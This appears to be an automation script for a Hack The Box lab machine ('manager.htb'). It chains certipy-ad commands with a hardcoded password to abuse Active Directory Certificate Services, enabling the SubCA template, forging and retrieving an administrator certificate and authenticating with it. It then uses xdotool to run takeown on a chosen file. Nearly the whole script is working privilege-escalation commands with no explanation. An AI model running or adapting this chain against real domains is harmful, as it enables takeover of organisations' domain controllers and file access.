#!/bin/bash

: '
exploit SeTakeOwnershipPrivilege permission
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "File"

FILE=${form_data["File"]}

certipy-ad find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.159.206 -stdout -vulnerable
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.159.206 -ca manager-dc01-ca -add-officer raven -debug
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.159.206 -ca manager-dc01-ca -enable-template subca
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.159.206 -ca manager-dc01-ca -list-template
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.159.206 -ca manager-dc01-ca -template SubCA -upn administrator@manager
certipy-ad ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.159.206 -ca manager-dc01-ca -issue-request 13
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.159.206 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb
certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.159.206 -ca manager-dc01-ca -retrieve 20
certipy-ad auth -pfx administrator.pfx
sudo ntpdate -s manager.htb
certipy-ad auth -pfx administrator.pfx

paste_command "takeown /f '${FILE}'"
xdotool key Return
sleep 2

paste_command "Get-ChildItem -Path '${FILE}' | select name,directory, @{Name="Owner";Expression={(Get-ACL \$_.Fullname).Owner}}"
xdotool key Return
sleep 2

kill $HTTP_PID